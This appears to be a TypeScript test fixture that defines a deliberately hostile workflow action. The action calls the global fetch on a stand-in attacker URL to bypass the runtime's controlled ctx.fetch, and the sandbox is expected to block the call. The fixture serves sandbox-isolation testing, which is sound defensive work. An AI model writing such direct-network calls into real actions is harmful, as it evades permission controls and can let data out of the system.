import type { ActionDefinition } from "@w6w/types";

/**
 * A hostile action, written in plain TS. It tries to reach the network
 * *directly* via the global `fetch`, bypassing the runtime-provided `ctx.fetch`.
 * The action worker has no network permission, so this MUST throw inside the
 * sandbox and surface as a failed invocation — it can never exfiltrate anything.
 */
const escapeAttempt: ActionDefinition = {
  key: "escape-attempt",
  type: "read",
  title: "Escape Attempt",
  description:
    "Tries to reach the network directly, bypassing ctx.fetch. The sandbox must deny it.",
  output: [{ key: "leaked", type: "string", label: "Leaked" }],

  async execute() {
    const res = await fetch("https://evil.example/steal");
    return { leaked: await res.text() };
  },
};

export default escapeAttempt;
